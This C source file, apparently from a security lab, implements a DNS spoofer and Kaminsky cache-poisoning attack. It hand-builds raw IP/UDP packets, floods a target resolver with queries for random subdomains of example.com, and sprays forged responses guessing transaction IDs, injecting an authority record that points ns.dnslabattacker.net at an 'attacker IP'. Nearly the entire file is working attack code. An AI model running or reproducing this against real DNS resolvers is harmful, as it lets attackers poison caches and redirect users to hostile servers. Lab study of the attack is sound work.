// Auth: Piergiorgio Ladisa
// Spoofer of DNS Packets and Kaminsky attack
// implementation.
//
// Compile command:
// gcc -lpcap udp.c -o udp
//
// 

#include <unistd.h>
#include <stdio.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <fcntl.h>
#include <string.h>
#include <errno.h>
#include <stdlib.h>
#include <libnet.h>


// The packet length
#define PCKT_LEN 8192

// The flag for the DNS Response
#define FLAG_R 0x8400

// The flag for the DNS Query
#define FLAG_Q 0x0100
	 


/******************************************************
				IP header's structure
******************************************************/
struct ipheader {

    unsigned char      iph_ihl:4, iph_ver:4;			// header length and version
    unsigned char      iph_tos;					// type of service
    unsigned short int iph_len;					// total length
    unsigned short int iph_ident;				// identification
    unsigned short int iph_offset;				// fragment offset field
    unsigned char      iph_ttl;					// time to live
    unsigned char      iph_protocol;				// protocol
    unsigned short int iph_chksum;				// checksum
    unsigned int       iph_sourceip;				// source address
    unsigned int       iph_destip;				// destination address
};

/******************************************************				
******************************************************/ 

/******************************************************
				UDP header's structure
******************************************************/   

struct udpheader {
	unsigned short int udph_srcport;			// source port
    unsigned short int udph_destport;				// destination port
    unsigned short int udph_len;				// udp length
    unsigned short int udph_chksum;				// udp checksum
}; // total udp header length: 8 bytes (=64 bits)

/******************************************************				
******************************************************/ 


/******************************************************
				DNS header's structure
******************************************************/  
struct dnsheader {
	unsigned short int query_id;				// identification number
	unsigned short int flags;				// flags: e.g. rd, tc, aa, opcode...
	unsigned short int QDCOUNT;				// number of question entries
	unsigned short int ANCOUNT;				// number of answer entries
	unsigned short int NSCOUNT;				// number of authority entries
	unsigned short int ARCOUNT;				// number of resource entries
};

/* 
	Constant sized fields that appears in each DNS item
*/
struct dataEnd{
	unsigned short int  type;
	unsigned short int  class;
};

/*
	structure to contain the Answer end section
*/

struct ansEnd{
	unsigned short int type;
	unsigned short int class;
	unsigned short int ttl_l;
	unsigned short int ttl_h;
	unsigned short int datalen;
};

/*
	structure to contain the Authoritative end section
*/
struct nsEnd{
	unsigned short int type;
	unsigned short int class;
	unsigned short int ttl_l;
	unsigned short int ttl_h;
	unsigned short int datalen;

};

/*
	structure to contain the Additional Record end section
*/
struct arEnd{

	unsigned short int type;
	unsigned short int class;
	unsigned short int ttl_l;
	unsigned short int ttl_h;
	unsigned short int datalen;

};

/******************************************************				
******************************************************/ 

unsigned int checksum(uint16_t *usBuff, int isize){
	unsigned int cksum=0;
	for(;isize>1;isize-=2){
		cksum+=*usBuff++;
	   }
	if(isize==1){
		cksum+=*(uint16_t *)usBuff;
		}

	return (cksum);
}

//  calculate udp checksum
//	|				|				||				|		|		|
//	|	IP header 		|	UDP header 		||	DNS header 		| -- Payload -- |
//	|				|				||				|		|		|
uint16_t check_udp_sum(uint8_t *buffer, int len){
	unsigned long sum=0;
	struct ipheader *tempI=(struct ipheader *)(buffer);	// 
	struct udpheader *tempH=(struct udpheader *)(buffer+sizeof(struct ipheader));
	struct dnsheader *tempD=(struct dnsheader *)(buffer+sizeof(struct ipheader)+sizeof(struct udpheader));
	tempH->udph_chksum=0;
	sum=checksum( (uint16_t *)   &(tempI->iph_sourceip) ,8 );
	sum+=checksum((uint16_t *) tempH,len);

	sum+=ntohs(IPPROTO_UDP+len);	// convert from network byte order (MSB) into host byte order (LSB)

	sum=(sum>>16)+(sum & 0x0000ffff);
	sum+=(sum>>16);

	return (uint16_t)(~sum);
	
}
 


// Function for checksum calculation. From the RFC,
// the checksum algorithm is:
//  "The checksum field is the 16 bit one's complement of the one's
//  complement sum of all 16 bit words in the header.  For purposes of
//  computing the checksum, the value of the checksum field is zero."
unsigned short csum(unsigned short *buf, int nwords){       

	unsigned long sum;
	
	for(sum=0; nwords>0; nwords--)
		sum += *buf++;
	sum = (sum >> 16) + (sum &0xffff);
	sum += (sum >> 16);

	return (unsigned short)(~sum);

}

/*
*	Function: dnsQueryBuilder()
*	
*	Description: This function forges DNS query.
*				 
*	Parameters: 
*		- requested_url: the name of the domain queried;
*		- srcAddr: source IP address, the one that is querying;
*		- dstAddr: destination IP address, that is the one of the
*				   local DNS;
*
*	Return:
*		  global packet length
*/
int dnsQueryBuilder(char *buffer_query,char *srcAddr, char *dstAddr){

	// Our own headers' structures
	struct ipheader *ip_query = (struct ipheader *) buffer_query;
	struct udpheader *udp_query = (struct udpheader *) (buffer_query + sizeof(struct ipheader));
	struct dnsheader *dns_query = (struct dnsheader*) (buffer_query +sizeof(struct ipheader)+sizeof(struct udpheader));
	// data is the pointer points to the first byte of the dns payload  
	char *data_query = (buffer_query +sizeof(struct ipheader)+sizeof(struct udpheader)+sizeof(struct dnsheader));

	/*
	 *	DNS Header construction
	 */
	dns_query->flags=htons(FLAG_Q);	// Flag = Query; this is a DNS query
	//only 1 query, so the count should be one.
	dns_query->QDCOUNT=htons(1);	// the DNS ask for one domain's IP only
	
	/*
	 *	Query field construction
	 */
	strcpy(data_query, "\5aaaaa\7example\3com");
	int length_query= strlen(data_query)+1;	// the +1 is for the end of string character 0x00

	/*
	 * Add the suffix
	 */
	struct dataEnd *end_query=(struct dataEnd *)(data_query+length_query);
	end_query->type=htons(1);	// type: A(IPv4)
	end_query->class=htons(1);	// class: IN(Internet)


	/*
	 *	UDP Header construction
	 */
	udp_query->udph_srcport = htons(40000+rand()%10000);  // source port number; random because the lower number may be reserved
	udp_query->udph_destport = htons(53);		// Default DNS port: 53
	unsigned short int udpLength_query = sizeof(struct udpheader)+sizeof(struct dnsheader)+length_query+sizeof(struct dataEnd);
	udp_query->udph_len = htons(udpLength_query); // udp_header_size + udp_payload_size


	/*
	 *	IP Header construction
	 */
	ip_query->iph_ihl = 5;
	ip_query->iph_ver = 4;
	ip_query->iph_tos = 0; // Low delay
	ip_query->iph_ident = htons(rand()); // we give a random number for the identification#
	ip_query->iph_ttl = 110; // hops
	ip_query->iph_protocol = 17; // UDP
	ip_query->iph_sourceip = inet_addr(srcAddr);
	ip_query->iph_destip = inet_addr(dstAddr);
	unsigned short int ipPacketLength_query = sizeof(struct ipheader)+sizeof(struct udpheader)+sizeof(struct dnsheader)+length_query+sizeof(struct dataEnd);
	ip_query->iph_len = htons(ipPacketLength_query);
	 
	// Calculate the checksum for integrity//
	//ip->iph_chksum = csum((unsigned short *)buffer, sizeof(struct ipheader) + sizeof(struct udpheader));
	//udp->udph_chksum=check_udp_sum(buffer, packetLength-sizeof(struct ipheader));
	
	return ipPacketLength_query;
}


/*
*	Function: dnsResponseBuilder()
*	
*	Description: This function forges spoofed DNS 
*				 answers.
*	Parameters: 
*		- buffer_response: pointer to the buffer;
*		- requested_url: the name of the domain queried;
*		- srcAddr: source IP address;
*		- dstAddr: destination IP address;
*
*	Return:
*		DNS packet length
*/
int dnsResponseBuilder(char *buffer_response, char *srcAddr, char *dstAddr){
	
	// Our own headers' structures
	struct ipheader *ip_response = (struct ipheader *) buffer_response;
	struct udpheader *udp_response = (struct udpheader *) (buffer_response + sizeof(struct ipheader));
	struct dnsheader *dns_response=(struct dnsheader*) (buffer_response +sizeof(struct ipheader)+sizeof(struct udpheader));
	// data is the pointer points to the first byte of the dns payload  
	char *data_response=(buffer_response +sizeof(struct ipheader)+sizeof(struct udpheader)+sizeof(struct dnsheader));

	/*
	 *	DNS Header construction
	 */
	dns_response->flags=htons(FLAG_R);	// Flag = Response; this is a DNS response
	dns_response->QDCOUNT=htons(1);		// 1 question section, so the count should be one.
	dns_response->ANCOUNT=htons(1);		// 1 answer section
	dns_response->NSCOUNT=htons(1);		// 1 authority section
	dns_response->ARCOUNT=htons(2);		// 1 additional section

	//query string
	strcpy(data_response,"\5aaaaa\7example\3com");
	int length_response=strlen(data_response)+1;	// the +1 is for the end of string character 0x00

	/*
	 * AQuestion section of the reply
	 */
	struct dataEnd *end_response=(struct dataEnd *)(data_response+length_response);
	end_response->type=htons(1);		// type: A(IPv4)
	end_response->class=htons(1);	// class: IN(Internet)

	////////////////////////////////////////////
	// Answer field
	// - C00C in the name field for the offset
	// - Type and Class
	// - TTL
	// - ResponseData Length
	// - Response data (IP address) 
	// 
	///////////////////////////////////////////

	char *writingPointer = data_response+length_response+sizeof(struct dataEnd); // points to where we're writing
	unsigned short int *domainPointer = (unsigned short int *)writingPointer;
	//The NAME field contains first 2 bits equal to 1, then 14 next bits 
	// contain an unsigned short int which count the byte offset from the 
	// beginiing of the message
	// 0xc0: means that this is not a string structure but a reference to a
	// 		 string which exists in the packet
	// 0x0c: 12 is the offset from the beginning of the DNS header which point
	//		 to "www.example.net"
  	*domainPointer = htons(0xC00C); 
  	writingPointer+=2;

  	// TYPE and CLASS, same as before in the question field
  	end_response = (struct dataEnd*) writingPointer;
  	end_response->type=htons(1);		// type: A(IPv4)
	end_response->class=htons(1);	// class: IN(Internet)
	writingPointer+=sizeof(struct dataEnd);
	// TTL Section
	*writingPointer = 2; // TTL of 4 bytes
	writingPointer+=4;

	// RDLENGTH = byte length of the following RDATA
	*(short *)writingPointer = htons(4); // 32 bit of the IP Address
	writingPointer+=2;
	// RDDATA, contains the IP Address of the attacker (in our case)
	*(unsigned int*)writingPointer=inet_addr("10.0.2.6"); //attacker IP 
	writingPointer+=4;
	/////////////////////////////////////////////
	// answer section end
	////////////////////////////////////////////
	
	////////////////////////////////////////////
	// Authority field
	// - C012 in the name field for the offset
	// - Type and Class
	// - TTL
	// - Name server length
	// - Name server 
	// 
	///////////////////////////////////////////
	domainPointer = (short int *)writingPointer;
	*domainPointer = htons(0xC012);
	writingPointer+=2;

	// Type and class
	end_response = (struct dataEnd *) writingPointer;
  	end_response->type=htons(2);		// type: NS
	end_response->class=htons(1);	// class: IN(Internet)
	writingPointer+=sizeof(struct dataEnd);

	// TTL Section
	*writingPointer = 2; // TTL of 4 bytes
	writingPointer+=4;

	// NS Length
	*(short *)writingPointer=htons(23);
	writingPointer+=2;	// is a short int

	// NS name here
	strcpy(writingPointer, "\2ns");
	writingPointer+=3;
	*(writingPointer++)=14;
	strcpy(writingPointer, "dnslabattacker\3net");
	writingPointer+=14+5; // NSLength-1-3


	/////////////////////////////////////////////
	// authoritative section end
	////////////////////////////////////////////



	////////////////////////////////////////////
	// Additional Record section
	// begin here.
	// Mapping of ns.dnslabattacker.net->IP address
	//
	// 2nd Additional record OPT type
	////////////////////////////////////////////
	//strcpy(writingPointer, "\2ns");
	//writingPointer+=3;
	domainPointer = (short int *)writingPointer;
	*domainPointer = htons(0xC03F);
	writingPointer+=2;

	// Type and class
	end_response = (struct dataEnd *) writingPointer;
  	end_response->type=htons(1);		// type: 
	end_response->class=htons(1);	// class: IN(Internet)
	writingPointer+=sizeof(struct dataEnd);

	// TTL
	*writingPointer = 2; // TTL of 4 bytes
	writingPointer+=4;

	// RDLENGTH = byte length of the following RDATA
	*(short *)writingPointer = htons(4); // 32 bit of the IP Address
	writingPointer+=2;
	// RDDATA, contains the IP Address of the attacker (in our case)
	*(unsigned int*)writingPointer=inet_addr("10.0.2.6"); // attacker IP
	writingPointer+=4;


	// ROOT additional, OPT field
	int i;
	unsigned char temp[11]= {0x00,0x00,0x29,0x10,0x00,0x00,
				0x00,0x88,0x00,0x00,0x00};
	for(i=0;i<11;i++)
		writingPointer[i]=temp[i];
	writingPointer+=11;

	/////////////////////////////////////////////
	// additional section end
	////////////////////////////////////////////
	


	/*
	 *	UDP Header construction
	 */
	udp_response->udph_srcport = htons(53);  // source port number; random because the lower number may be reserved
	udp_response->udph_destport = htons(33333);		// Default DNS port: 53
	unsigned short int udpHLength_response= writingPointer - (char *)udp_response;
	udp_response->udph_len = htons(udpHLength_response); // udp_header_size + udp_payload_size


	/*
	 *	IP Header construction
	 */
	ip_response->iph_ihl = 5;
	ip_response->iph_ver = 4;
	ip_response->iph_tos = 0; // Low delay
	ip_response->iph_ident = htons(rand()); // we give a random number for the identification#
	ip_response->iph_ttl = 110; // hops
	ip_response->iph_protocol = 17; // UDP
	ip_response->iph_sourceip = inet_addr(srcAddr);
	ip_response->iph_destip = inet_addr(dstAddr);
	unsigned short int ipPacketLength_response = writingPointer - (char *)udp_response + sizeof( struct ipheader) ;
	ip_response->iph_len = htons(ipPacketLength_response);
	 
	// Calculate the checksum for integrity//
	//ip->iph_chksum = csum((unsigned short *)buffer, sizeof(struct ipheader) + sizeof(struct udpheader));
	//udp->udph_chksum=check_udp_sum(buffer, packetLength-sizeof(struct ipheader));
	

	return writingPointer-(char *)udp_response+sizeof(struct ipheader);
}


	
int main(int argc, char *argv[]){



	// This is to check the argc number
	if(argc != 3){

		printf("- Invalid parameters!!!\nPlease enter 2 ip addresses\nFrom first to last:src_IP  dest_IP  \n");
   
		exit(-1);

	}


	// socket descriptor
	int sd_query, sd_response;

	// buffer to hold the packet
	char buffer_query[PCKT_LEN];
	char buffer_response[PCKT_LEN];

	// set the buffer to 0 for all bytes
	memset(buffer_query, 0, PCKT_LEN);
	memset(buffer_response, 0, PCKT_LEN);

	// Our own headers' structures

	struct ipheader *ip_query = (struct ipheader *) buffer_query;
	struct udpheader *udp_query = (struct udpheader *) (buffer_query + sizeof(struct ipheader));
	struct dnsheader *dns_query=(struct dnsheader*) (buffer_query +sizeof(struct ipheader)+sizeof(struct udpheader));

	struct ipheader *ip_response = (struct ipheader *) buffer_response;
	struct udpheader *udp_response = (struct udpheader *) (buffer_response + sizeof(struct ipheader));
	struct dnsheader *dns_response=(struct dnsheader*) (buffer_response +sizeof(struct ipheader)+sizeof(struct udpheader));

	// data is the pointer points to the first byte of the dns payload  
	char *data_query=(buffer_query +sizeof(struct ipheader)+sizeof(struct udpheader)+sizeof(struct dnsheader));
	char *data_response=(buffer_response +sizeof(struct ipheader)+sizeof(struct udpheader)+sizeof(struct dnsheader));


	int packetLength_query = dnsQueryBuilder(buffer_query, argv[1], argv[2]);
	int packetLength_response = dnsResponseBuilder(buffer_response, "199.43.135.53", argv[2]);
	// Source and destination addresses: IP and port

	struct sockaddr_in sin, din;
	int one = 1;
	const int *val = &one;

	// Create a raw socket with UDP protocol

	sd_query = socket(PF_INET, SOCK_RAW, IPPROTO_UDP);
	sd_response = socket(PF_INET, SOCK_RAW, IPPROTO_UDP);

	if(sd_query<0 || sd_response<0 ) // if socket fails to be created 
		printf("socket error\n");


	// The source is redundant, may be used later if needed

	// The address family

	sin.sin_family = AF_INET;
	din.sin_family = AF_INET;

	// Port numbers
	sin.sin_port = htons(33333);
	din.sin_port = htons(53);
	// IP addresses

	sin.sin_addr.s_addr = inet_addr(argv[2]); // slocal DNS ip
	din.sin_addr.s_addr = inet_addr(argv[1]); // query source IP
	 
	// Calculate the checksum for integrity//

	ip_query->iph_chksum = csum((unsigned short *)buffer_query, sizeof(struct ipheader) + sizeof(struct udpheader));
 	ip_response->iph_chksum = csum((unsigned short *)buffer_response, sizeof(struct ipheader) + sizeof(struct udpheader));

	udp_query->udph_chksum=check_udp_sum(buffer_query, packetLength_query-sizeof(struct ipheader));
	udp_response->udph_chksum=check_udp_sum(buffer_response, packetLength_response-sizeof(struct ipheader));
	
	/*******************************************************************************8
	Just for knowledge purpose,
	remember the seconed parameter
	for UDP checksum:
	ipheader_size + udpheader_size + udpData_size  
	for IP checksum: 
	ipheader_size + udpheader_size
	*********************************************************************************/



	// Inform the kernel do not fill up the packet structure. we will build our own...
	if(setsockopt(sd_query, IPPROTO_IP, IP_HDRINCL, val, sizeof(one))<0 ){
		printf("error\n");	
		exit(-1);
	}
	if(setsockopt(sd_response, IPPROTO_IP, IP_HDRINCL, val, sizeof(one))<0 ){
		printf("error\n");	
		exit(-1);
	}
	printf("Entering the loop\n");

	while(1){	
	// This is to generate different query in xxxxx.example.net
		int charnumber;
		charnumber=1+rand()%5;
		*(data_query+charnumber)+=1;
		*(data_response+charnumber)+=1;

		udp_query->udph_chksum=check_udp_sum(buffer_query, packetLength_query-sizeof(struct ipheader)); // recalculate the checksum for the UDP packet

		if(sendto(sd_query, buffer_query, packetLength_query, 0, (struct sockaddr *)&sin, sizeof(sin)) < 0)
			printf("packet send error %d which means %s\n",errno,strerror(errno));
		dns_response->query_id=301;
		sleep(0.9);		// Wait for the query triggering the local DNS
		
		int count;
		for(count=0;count<=100;count++)
			{
        
				dns_response->query_id++; // try different transaction id: 301~401 for the range

				// update the checksum every time we modify the packet.
				udp_response->udph_chksum=check_udp_sum(buffer_response, packetLength_response-sizeof(struct ipheader));

				// send out the response dns  packet
				if(sendto(sd_response, buffer_response, packetLength_response, 0, (struct sockaddr *)&sin, sizeof(sin)) < 0)
					printf("packet send error %d which means %s\n",errno,strerror(errno));		
			}

			sleep(0.1); // don't flood the server too much to freeze the host machine
	}
	

	close(sd_query);

	return 0;

}



